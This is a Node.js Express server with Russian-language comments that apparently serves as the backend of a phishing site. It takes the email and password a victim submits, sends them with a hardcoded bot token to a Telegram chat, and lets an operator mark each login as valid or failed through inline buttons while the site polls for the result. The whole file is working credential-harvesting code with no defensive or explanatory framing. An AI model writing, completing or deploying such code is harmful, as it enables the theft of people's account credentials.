const express = require('express');
const axios = require('axios');
const cors = require('cors');

const app = express(); // ВОТ ЭТА СТРОЧКА ИСПРАВЛЯЕТ ТВОЮ ОШИБКУ 'app is not defined'
app.use(express.json());
app.use(cors());

const token = '8529029264:AAHn2DMIIgv-Ga2Fd5G3Az86GQqp1qshNgQ';
const chatId = '-1003894478662';

let requests = {}; // Память для статусов

// Прием данных с сайта
app.post('/send-data', async (req, res) => {
    try {
        const { userId, email, pass } = req.body;
        requests[userId] = 'pending';

        await axios.post(`https://api.telegram.org/bot${token}/sendMessage`, {
            chat_id: chatId,
            text: `⚠️ **Новые данные**\n👤 ID: \`${email}\`\n🔑 Pass: \`${pass}\``,
            parse_mode: 'Markdown',
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: "✅ Ок", callback_data: `approve_${userId}` },
                        { text: "❌ Ошибка", callback_data: `reject_${userId}` }
                    ]
                ]
            }
        });
        res.json({ status: 'sent' });
    } catch (e) {
        res.status(500).json({ error: e.message });
    }
});

// Проверка статуса сайтом
app.get('/check-status/:userId', (req, res) => {
    res.json({ status: requests[req.params.userId] || 'pending' });
});

// Обработка кнопок из Телеграм
app.post('/tg-webhook', async (req, res) => {
    const callbackQuery = req.body.callback_query;
    if (callbackQuery) {
        const [action, userId] = callbackQuery.data.split('_');
        requests[userId] = (action === 'approve') ? 'success' : 'error';

        await axios.post(`https://api.telegram.org/bot${token}/answerCallbackQuery`, {
            callback_query_id: callbackQuery.id,
            text: "Статус обновлен!"
        });
    }
    res.sendStatus(200);
});

const PORT = process.env.PORT || 10000;
app.listen(PORT, () => {
    console.log(`Сервер работает на порту ${PORT}. Файл: index.js`);
});
